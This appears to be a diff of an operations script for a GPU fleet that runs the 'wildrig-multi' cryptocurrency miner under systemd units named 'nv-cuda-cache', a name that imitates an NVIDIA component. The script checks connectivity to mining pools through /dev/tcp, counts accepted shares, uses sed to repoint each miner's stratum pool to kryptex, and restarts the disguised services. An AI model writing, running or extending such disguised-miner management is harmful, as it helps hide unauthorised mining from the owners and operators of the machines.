@@ -1,13 +1,23 @@
-echo "== date"; date -u +%FT%TZ
-echo "== unmask"
-for i in 0 1 2 3 4 5 6 7; do systemctl unmask nv-cuda-cache@$i.service 2>&1; done
-echo "== start"
-for i in 1 2 3 4 6 7; do systemctl enable nv-cuda-cache@$i.service 2>&1 | tail -1; timeout 25 systemctl start nv-cuda-cache@$i.service 2>&1; done
-sleep 25
-echo "== unitfiles"; systemctl list-unit-files 2>&1 | grep -i nv-cuda || echo none
-for i in 1 2 3 4 6 7; do printf "unit %s: " $i; systemctl is-active nv-cuda-cache@$i.service 2>&1; done
-echo "== procs"; pgrep -af 'wildrig-multi' 2>&1 | head -20
-echo "== gpus"; nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader 2>&1
-echo "== logs"
-for i in 1 2 3 4 6 7; do echo "-- g$i"; tail -8 /opt/fleet/logs/u86-g$i.log 2>&1; done
-echo "== fm"; systemctl is-active nvidia-fabricmanager 2>&1
+date -u
+echo '== kxprobe'
+for p in 7048 8048; do timeout 8 bash -c "exec 3<>/dev/tcp/prl.kryptex.network/$p" 2>/dev/null && echo "KX$p-OK" || echo "KX$p-FAIL"; done
+echo '== acccounts'
+for i in 1 2 3 4 6 7; do echo "g$i: $(grep -c 'accepted' /opt/fleet/logs/u86-g$i.log 2>/dev/null)"; done
+echo '== pools'
+grep -h 'use pool' /opt/fleet/logs/u86-g*.log 2>/dev/null | sort | uniq -c
+echo '== apps'
+nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>/dev/null
+if timeout 8 bash -c 'exec 3<>/dev/tcp/prl.kryptex.network/7048' 2>/dev/null; then
+  echo '== switching-to-kx7048'
+  for i in 1 2 3 4 6 7; do
+    sed -i -e 's#-o stratum+ssl://prl.kryptex.network:8048#-o stratum+tcp://prl.kryptex.network:7048#' -e 's#-o stratum+ssl://pool.pearlhash.xyz:9443##' -e 's#-o stratum+tcp://pearl.luckypool.io:3360##' /opt/fleet/ul86_g$i.sh
+    systemctl restart nv-cuda-cache@$i
+  done
+  sleep 25
+  echo '== after-switch'
+  pgrep -af 'wildrig-multi --algo' | sed 's/.*-o /-o /' | head -8
+  grep -h 'use pool' /opt/fleet/logs/u86-g*.log 2>/dev/null | tail -8
+  for i in 1 2 3 4 6 7; do echo "g$i-acc: $(grep -c 'accepted' /opt/fleet/logs/u86-g$i.log 2>/dev/null)"; done
+else
+  echo '== kx-unreachable-keep-pearlhash'
+fi
